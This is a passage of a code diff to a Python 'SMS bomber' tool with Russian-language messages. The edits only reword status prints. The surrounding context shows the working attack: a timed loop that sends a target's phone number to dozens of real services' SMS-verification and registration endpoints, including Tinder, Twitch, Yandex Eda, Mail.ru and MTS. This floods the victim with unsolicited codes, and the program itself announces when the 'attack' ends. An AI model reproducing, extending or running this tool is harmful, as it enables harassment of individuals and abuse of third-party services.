+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -11287,11 +11287,11 @@ if call == str(2):
             R = R + 1
             print('[+] Guru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -11300,11 +11300,11 @@ if call == str(2):
             R = R + 1
             print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -11313,11 +11313,11 @@ if call == str(2):
             R = R + 1
             print('[+] InDriver отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -11325,33 +11325,33 @@ if call == str(2):
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
@@ -11359,11 +11359,11 @@ if call == str(2):
             R = R + 1
             print('[+] Lenta отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -11371,11 +11371,11 @@ if call == str(2):
             R = R + 1
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -11384,11 +11384,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -11396,44 +11396,44 @@ if call == str(2):
             R = R + 1
             print('[+] OK отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://plink.tech/register/', json={"phone": _phone})
             R = R + 1
             print('[+] Plink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -11441,11 +11441,11 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -11455,11 +11455,11 @@ if call == str(2):
             R = R + 1
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -11467,10 +11467,10 @@ if call == str(2):
             R = R + 1
             print('[+] CabWiFi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -11478,11 +11478,11 @@ if call == str(2):
             R = R + 1
             print('[+] wowworks отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -11491,22 +11491,22 @@ if call == str(2):
             R = R + 1
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -11516,33 +11516,33 @@ if call == str(2):
             R = R + 1
             print('[+] Alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -11553,10 +11553,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -11565,10 +11565,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -11576,10 +11576,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -11588,10 +11588,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -11599,10 +11599,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -11612,10 +11612,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -11623,7 +11623,7 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
@@ -11631,11 +11631,11 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -11644,11 +11644,11 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -11657,10 +11657,10 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
@@ -11669,7 +11669,7 @@ if call == str(2):
             time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -11677,10 +11677,10 @@ if call == str(2):
             print('[+] RuTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправлено !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
@@ -11688,10 +11688,10 @@ if call == str(2):
             print('[+] BelkaCar отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправленo !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://starpizzacafe.com/mods/a.function.php',
@@ -11700,10 +11700,10 @@ if call == str(2):
             print('[+] StarPizzaCafe отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -11712,10 +11712,10 @@ if call == str(2):
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
@@ -11723,10 +11723,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -11735,10 +11735,10 @@ if call == str(2):
             print('[+] Tinkoff отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -11747,10 +11747,10 @@ if call == str(2):
             print('[+] Dostavista отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -11760,10 +11760,10 @@ if call == str(2):
             print('[+] MonoBank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -11772,10 +11772,10 @@ if call == str(2):
             print('[+] binotel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
@@ -11784,10 +11784,10 @@ if call == str(2):
             print('[+] SportMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -11796,10 +11796,10 @@ if call == str(2):
             print('[+] Alfalife отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
@@ -11807,10 +11807,10 @@ if call == str(2):
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://silpo.ua/graphql', data={
@@ -11820,10 +11820,10 @@ if call == str(2):
             print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })
@@ -11831,10 +11831,10 @@ if call == str(2):
             print('[+] BTfair отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ggbet.ru/api/auth/register-with-phone',
@@ -11844,10 +11844,10 @@ if call == str(2):
             print('[+] GGbet отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-]  не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.etm.ru/cat/runprog.html',
@@ -11857,10 +11857,10 @@ if call == str(2):
             print('[+] ETM отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -11869,10 +11869,10 @@ if call == str(2):
             print('[+] TheLive отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
@@ -11880,10 +11880,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
@@ -11894,7 +11894,7 @@ if call == str(2):
             print('[+] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://zoloto585.ru/api/bcard/reg/',
@@ -11905,10 +11905,10 @@ if call == str(2):
             print('[+] Zoloto585 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
@@ -11916,10 +11916,10 @@ if call == str(2):
             print('[+] Kasta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Kasta Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
@@ -11928,10 +11928,10 @@ if call == str(2):
             print('[+] Тaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -11941,10 +11941,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.creditter.ru/confirm/sms/send',
@@ -11953,10 +11953,10 @@ if call == str(2):
             print('[+] Creditter отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
@@ -11969,10 +11969,10 @@ if call == str(2):
             print('[+] Ingos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://win.1admiralxxx.ru/api/en/register.json',
@@ -11982,10 +11982,10 @@ if call == str(2):
             print('[+] Admiralxxx отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
@@ -11993,10 +11993,10 @@ if call == str(2):
             print('[+] Av отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -12005,10 +12005,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
@@ -12016,10 +12016,10 @@ if call == str(2):
             print('[+] City24 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
